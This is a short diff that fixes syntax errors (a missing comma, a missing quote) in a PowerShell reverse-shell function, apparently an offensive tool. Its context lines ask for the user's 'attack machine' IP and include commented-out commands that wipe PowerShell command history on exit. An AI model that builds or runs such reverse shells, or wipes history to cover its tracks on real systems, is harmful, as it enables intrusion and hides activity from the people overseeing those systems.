@@ -80,7 +80,7 @@ Function Invoke-ReversePowerShell {
                 Mandatory=$True,
                 Position=0,
                 ValueFromPipeline=$True,
-                ValueFromPipelineByPropertyName = $True
+                ValueFromPipelineByPropertyName = $True,
                 HelpMessage="Enter the IP Address of your attack machine. Example: 10.10.14.21"
             )] # End Parameter
                 [ValidateNotNullorEmpty()]
@@ -175,7 +175,7 @@ Function Invoke-ReversePowerShell {
             If($Client.Connected)
             {
             
-                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines
+                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
                 # Clear-History
                 # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
 
